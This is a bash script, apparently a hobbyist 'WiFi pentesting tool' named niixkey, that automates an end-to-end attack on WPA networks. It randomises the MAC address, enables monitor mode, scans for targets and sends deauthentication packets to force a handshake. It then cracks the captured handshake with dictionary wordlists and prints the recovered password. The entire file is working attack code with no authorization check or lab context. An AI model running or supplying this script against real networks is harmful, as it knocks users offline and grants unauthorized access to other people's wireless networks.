#!/bin/bash
# -----------------------------------------------
# niixkey - WiFi Pentesting Tool (v1.61 Alpha)
# debian-based systems
# -----------------------------------------------

# =============[ Configuration ]=============
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m'

WORKSPACE="$HOME/niixkey_scans"
WORDLISTS=("/usr/share/wordlists/rockyou.txt" "/usr/share/wordlists/passwords.txt")

# =============[ ASCII Art ]=============
show_banner() {
    clear
    echo -e "${BLUE}"
      echo " ███▄    █  ██▓ ██▓▒██   ██▒ ██ ▄█▀▓█████ ▓██   ██▓"
      echo " ██ ▀█   █ ▓██▒▓██▒▒▒ █ █ ▒░ ██▄█▒ ▓█   ▀  ▒██  ██▒"
      echo "▓██  ▀█ ██▒▒██▒▒██▒░░  █   ░▓███▄░ ▒███     ▒██ ██░"
      echo "▓██▒  ▐▌██▒░██░░██░ ░ █ █ ▒ ▓██ █▄ ▒▓█  ▄   ░ ▐██▓░"
      echo "▒██░   ▓██░░██░░██░▒██▒ ▒██▒▒██▒ █▄░▒████▒  ░ ██▒▓░"
      echo "░ ▒░   ▒ ▒ ░▓  ░▓  ▒▒ ░ ░▓ ░▒ ▒▒ ▓▒░░ ▒░ ░   ██▒▒▒ "
      echo "░ ░░   ░ ▒░ ▒ ░ ▒ ░░░   ░▒ ░░ ░▒ ▒░ ░ ░  ░ ▓██ ░▒░ "
      echo "   ░   ░ ░  ▒ ░ ▒ ░ ░    ░  ░ ░░ ░    ░    ▒ ▒ ░░  "
      echo "         ░  ░   ░   ░    ░  ░  ░      ░  ░ ░ ░     "
      echo "                                           ░ ░     "
     echo -e "${NC}"
echo "         >> WiFi Toolkit <<"
echo "-----------------------------------------------"
read -p "Press [Enter] to begin..."
}

# =============[ Core Functions ]=============
check_requirements() {
    echo -e "\n${YELLOW}[*] Checking system requirements...${NC}"
    
    REQUIRED_TOOLS=("aircrack-ng" "iwconfig" "macchanger" "hcxdumptool")
    MISSING=()
    
    for tool in "${REQUIRED_TOOLS[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            MISSING+=("$tool")
        fi
    done
    
    if [ ${#MISSING[@]} -ne 0 ]; then
        echo -e "${RED}[!] Missing tools: ${MISSING[*]}${NC}"
        echo -e "${YELLOW}[*] Try: sudo apt install ${MISSING[*]}${NC}"
        exit 1
    else
        echo -e "${GREEN}[+] All requirements satisfied${NC}"
    fi
}

setup_environment() {
    echo -e "\n${YELLOW}[*] Preparing workspace...${NC}"
    mkdir -p "$WORKSPACE"
    
    INTERFACES=($(iwconfig 2>/dev/null | grep -E "^\w" | awk '{print $1}'))
    
    if [ ${#INTERFACES[@]} -eq 0 ]; then
        echo -e "${RED}[!] No wireless interfaces found${NC}"
        exit 1
    fi
    
    echo -e "\n${BLUE}[*] Available interfaces:${NC}"
    for i in "${!INTERFACES[@]}"; do
        echo "[$i] ${INTERFACES[$i]}"
    done
    
    read -p "Select interface number: " CHOICE
    SELECTED_INTERFACE="${INTERFACES[$CHOICE]}"
    
    echo -e "${YELLOW}[*] Configuring $SELECTED_INTERFACE...${NC}"
    sudo airmon-ng check kill > /dev/null 2>&1
    sudo ip link set "$SELECTED_INTERFACE" down
    sudo macchanger -r "$SELECTED_INTERFACE" > /dev/null 2>&1
    sudo ip link set "$SELECTED_INTERFACE" up
    
    if sudo airmon-ng start "$SELECTED_INTERFACE" > /dev/null 2>&1; then
        MONITOR_INTERFACE=$(iwconfig 2>/dev/null | grep "Mode:Monitor" | awk '{print $1}')
        echo -e "${GREEN}[+] Monitor mode active on $MONITOR_INTERFACE${NC}"
    else
        echo -e "${RED}[!] Failed to enable monitor mode${NC}"
        exit 1
    fi
}

scan_networks() {
    echo -e "\n${YELLOW}[*] Scanning for targets (15 seconds)...${NC}"
    timeout 15 sudo airodump-ng "$MONITOR_INTERFACE" -w "$WORKSPACE/scan" --output-format csv > /dev/null 2>&1
    
    TARGETS=($(grep -E "WPA[2-3]" "$WORKSPACE/scan-01.csv" | awk -F',' '{print $1 " " $4 " " $6 " " $9}'))
    
    if [ ${#TARGETS[@]} -eq 0 ]; then
        echo -e "${RED}[!] No WPA networks detected${NC}"
        exit 1
    fi
    
    echo -e "\n${GREEN}[+] Discovered Networks:${NC}"
    echo "-------------------------------------"
    printf "%-4s %-18s %-8s %s\n" "NUM" "BSSID" "CHANNEL" "SSID"
    echo "-------------------------------------"
    
    for i in "${!TARGETS[@]}"; do
        IFS=' ' read -r bssid channel _ ssid <<< "${TARGETS[$i]}"
        printf "%-4s %-18s %-8s %s\n" "[$i]" "$bssid" "$channel" "$(echo "$ssid" | tr -d '"')"
    done
    
    read -p "Select target number: " TARGET_CHOICE
    IFS=' ' read -r TARGET_BSSID TARGET_CHANNEL _ TARGET_SSID <<< "${TARGETS[$TARGET_CHOICE]}"
    TARGET_SSID=$(echo "$TARGET_SSID" | tr -d '"')
    
    echo -e "\n${GREEN}[+] Selected Target:${NC}"
    echo "  SSID:    $TARGET_SSID"
    echo "  BSSID:   $TARGET_BSSID"
    echo "  Channel: $TARGET_CHANNEL"
}

run_attack() {
    echo -e "\n${YELLOW}[*] Starting attack sequence...${NC}"
    
    # Capture handshake
    echo -e "${BLUE}[*] Attempting handshake capture...${NC}"
    HANDSHAKE_FILE="$WORKSPACE/handshake_$(date +%s).cap"
    
    timeout 30 sudo airodump-ng -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" -w "$HANDSHAKE_FILE" "$MONITOR_INTERFACE" > /dev/null 2>&1 &
    
    sleep 5
    echo -e "${YELLOW}[*] Sending deauth packets...${NC}"
    sudo aireplay-ng --deauth 5 -a "$TARGET_BSSID" "$MONITOR_INTERFACE" > /dev/null 2>&1
    
    sleep 10
    if aircrack-ng "$HANDSHAKE_FILE" 2>/dev/null | grep -q "1 handshake"; then
        echo -e "${GREEN}[+] Handshake captured!${NC}"
    else
        echo -e "${RED}[!] Handshake capture failed${NC}"
        return 1
    fi
    
    # Crack the handshake
    echo -e "\n${BLUE}[*] Starting dictionary attack...${NC}"
    for wordlist in "${WORDLISTS[@]}"; do
        if [ -f "$wordlist" ]; then
            echo -e "${YELLOW}[*] Trying $wordlist...${NC}"
            aircrack-ng -w "$wordlist" -b "$TARGET_BSSID" "$HANDSHAKE_FILE" | tee "$WORKSPACE/crack_attempt.txt"
            
            if grep -q "KEY FOUND" "$WORKSPACE/crack_attempt.txt"; then
                FOUND_KEY=$(grep "KEY FOUND" "$WORKSPACE/crack_attempt.txt" | awk '{print $4}')
                echo -e "\n${GREEN}[+] Success! Password: $FOUND_KEY${NC}"
                return 0
            fi
        fi
    done
    
    echo -e "${RED}[!] Password not found in wordlists${NC}"
    return 1
}

cleanup() {
    echo -e "\n${YELLOW}[*] Cleaning up...${NC}"
    sudo airmon-ng stop "$MONITOR_INTERFACE" > /dev/null 2>&1
    sudo service network-manager restart > /dev/null 2>&1
    echo -e "${GREEN}[+] Done. Results saved in $WORKSPACE${NC}"
}

# =============[ Main Execution ]=============
main() {
    show_banner
    check_requirements
    setup_environment
    scan_networks
    run_attack
    cleanup
}

main
